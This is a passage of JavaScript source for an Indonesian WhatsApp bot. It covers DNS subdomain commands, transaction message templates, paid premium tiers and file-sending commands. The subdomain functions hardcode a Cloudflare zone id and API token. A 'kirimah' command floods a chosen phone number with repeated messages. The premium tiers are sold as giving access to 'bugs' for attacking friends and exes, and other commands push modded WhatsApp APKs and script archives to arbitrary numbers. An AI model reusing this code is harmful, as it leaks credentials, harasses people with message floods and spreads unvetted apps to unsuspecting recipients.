                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
case 'domain19': {
    if (!isOwner) return m.reply(`khusus Creator`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "6cbcca73a1d2eadde62edfd18d29f65d";
               let apitoken = "8hA4i28Ulod0AoDA_wuWaHiKqAPh_tZ6b4kphQbn";
               let tld = "crazyyhosting.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
case 'domain20': {
    if (!isOwner) return m.reply(`khusus Creator`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "6cbcca73a1d2eadde62edfd18d29f65d";
               let apitoken = "8hA4i28Ulod0AoDA_wuWaHiKqAPh_tZ6b4kphQbn";
               let tld = "crazyyhosting.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case 'domain34': case 'domain35': {
     if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isOwner) return m.reply("maaf su fitur ini khusus tuan saya.")
     }
     break
     case 'delgc':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return reply(mess.only.group)
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
reply(`${command} Sukses Menonaktifkan Fitur Domain Di Grup Ini Tuan✅`)
break
       case 'addgc':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return reply(mess.only.group)
pler.push(m.chat)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
reply(`${command} Sukses Mengaktifkan Fitur Domain Di Grup Ini Tuan✅`)
           break
        case 'kirimah': {
  if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
  if (!quoted) return m.reply('Format salah!!\nContoh: kirimah text,nomor,jumlah');
  
  let params = text.split(',');
  if (params.length < 3) return m.reply('Format salah!!\nContoh: kirim text,nomor,jumlah');

  let messageText = params[0];
  let targetNumber = params[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  let messageCount = parseInt(params[2]);

  if (isNaN(messageCount) || messageCount < 1) return m.reply('Jumlah pesan harus berupa angka yang lebih besar dari 0.');

  const promises = [];
  for (let i = 0; i < messageCount; i++) {
    promises.push(
      Biiofc.sendMessage(targetNumber, {
        text: `*${messageText}*`,
        mentions: [sender]
      }, {
        quoted: lep
      })
    );
  }

  Promise.all(promises)
    .then(() => {
      m.reply(`Berhasil mengirim ${messageCount} bug pesan!`);
    })
    .catch(() => {
      m.reply('Gagal mengirim pesan!');
    });

  break;
}
        case 'done':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal`);
let barang = t[0];
let nominal = t[1];
reply(`*━━ TRANSAKSI INFO ━━*

 _• *Barang:* ${barang}_
 _• *Nominal:* ${nominal}_
 _• *Tanggal:* Rp${tanggal}_

*TERIMA KASIH TELAH ORDER DI ${global.namaCreator}*\n*JANGAN LUPA ORDER LAGI YA*🙏`)
}
        break
case 'done?':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
let tek = (`「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Berhasil\`\`\`\n\nTerimakasih Telah order di *${global.namaCreator}*\nNext Order ya🙏`)
//let btn_menu = [
//{buttonId: `${prefix}aokeguwgw`, buttonText: { displayText: 'OKE THENKS👍' }, type: 1 },
//]
Biiofc.sendMessage(from,
{text: tek})
//buttons: btn_menu})
}
       break
case "tunda": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚* )▭▬▭


𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚
𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "proses": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *𝗦𝗘𝗗𝗔𝗡𝗚 𝗗𝗜 𝗣𝗥𝗢𝗦𝗘𝗦* )▭▬▭


𝗛𝗮𝗿𝗮𝗽 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗯𝗲𝗻𝘁𝗮𝗿
𝗣𝗿𝗼𝗱𝘂𝗸 𝗦𝗲𝗱𝗮𝗻𝗴 𝗗𝗶 𝗣𝗿𝗼𝘀𝗲𝘀️

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "batal": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗔𝗧𝗔𝗟* )▭▬▭

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${jam}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "reqvps": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *REQUEST VPS* )▭▬▭

Region : 
Os : 
Version : 
Ram : 
Ip : 
Password : 
*Garansi 15 Day*
*Create ${tanggal}*
*Hari Ini ${hariini}*

⸼  ࣪ ׅ ︶︶︶  𖣇𖢅𖣇  ︶︶︶ ⸼  ࣪ ׅ
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "reqpanel": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *REQUEST PANEL* )▭▬▭

Ram : 
Username :
Nomor Wa : 
*Garansi 15 Day*
*Create ${tanggal}*
*Hari Ini ${hariini}*

⸼  ࣪ ׅ ︶︶︶  𖣇𖢅𖣇  ︶︶︶ ⸼  ࣪ ׅ
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
        //Bagian Otomatis Menu
        case "buyowner":
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283183432282`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknbos = await Biiofc.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknbos.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Selamat Kepada ${pushname} dengan nomor ${bnnd} telah premium 

Keuntungan Owner👇🏻
-Muncul dalam daftar Owner
-Bisa Akses Semua Bug
-Bisa Create Panel
-Bisa Bug Temen Usil
-Bisa Bug Mantan

NOTE:WAJIB JEDA GA JEDA? DELPREM 
#ALL TRX NO REFF`)
        minSaldo(sender, 20000, db_saldo)
break
        case "buyprem":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283183432282`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Selamat Kepada ${pushname} dengan nomor ${prrkek} telah premium 

Keuntungan Premium👇🏻
-Bisa Akses Semua Bug
-Bisa Create Panel
-Bisa Bug Temen Usil
-Bisa Bug Mantan

NOTE:WAJIB JEDA GA JEDA? DELPREM 
#ALL TRX NO REFF`)
}
   minSaldo(sender, 10000, db_saldo)     
break
        case 'minsaldo':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!q.split(",")[0]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) < q.split(",")[1] && cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) !== 0) return m.reply(`Dia saldonya ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)}, jadi jangan melebihi ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)} yah kak🙏`)
minSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await sleep(50)
m.reply(`「 *SALDO USER* 」
⭔ID: ${q.split(",")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Tanggal: ${tanggal}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
break
                case 'ambilwa1': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/i7jzbmhpse5q41a/THEMA+ORIGINAL.apk/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'ambilwa2': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/cd541f9b7u12cpf/THEMA+MERAH.apk/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'ambilwa3': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/2je9qiwrzckvws5/TEMA+UNGGU.apk/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'ambilwa4': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/5qfss7f1ah3up0p/FMWhatsApp_Imnune.apk/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'ambilsc1': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/cku38uri67q16ov/Free1.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'ambilsc2': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/zm56k87hqst54cq/Free2.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'ambilsc3': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/f4a7sxq6lmdhpwd/Free3.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'ambilsc4': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/n0d2o3u98q0anw9/Free4.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'ambilsc5': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/g01n99speif85bj/Free5.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'ambilsc6': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/m4tgdftzm9t2nji/Free6.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'ambilsc7': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/x6th6u4nh8ad8wv/Scv7.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'ambilsc8': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/k13jxfbeimrrtjn/Sc+Gratis+By+Rafathar.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'ambilsc9': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/b4qcuinhpkmg5n8/Sc+Gratis.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'ambilsc10': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/0xy68my2nju4rx0/Pw+Cari+Sendiri,+Gush+Chat+Gw.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'ambilsc11': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/lv7zxaijoonpexd/Sc+Hw21_No+Enc.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'sendwa1': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!args[0]) return reply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
reply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/i7jzbmhpse5q41a/THEMA+ORIGINAL.apk/file')
Biiofc.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'sendwa2': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
